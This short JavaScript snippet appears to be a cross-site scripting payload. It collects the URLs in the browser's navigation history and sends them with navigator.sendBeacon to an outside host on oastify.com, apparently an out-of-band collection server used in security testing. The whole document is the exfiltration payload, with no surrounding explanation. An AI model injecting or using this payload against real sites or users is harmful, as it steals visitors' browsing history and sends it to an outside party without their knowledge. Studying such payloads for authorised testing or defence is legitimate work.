const list = window.navigation.entries();
const history = []
list.forEach(e => history.push(e.url));
navigator.sendBeacon("http://b3fla4t84373h4cf78qe947fr6xxlo9d.oastify.com", history)
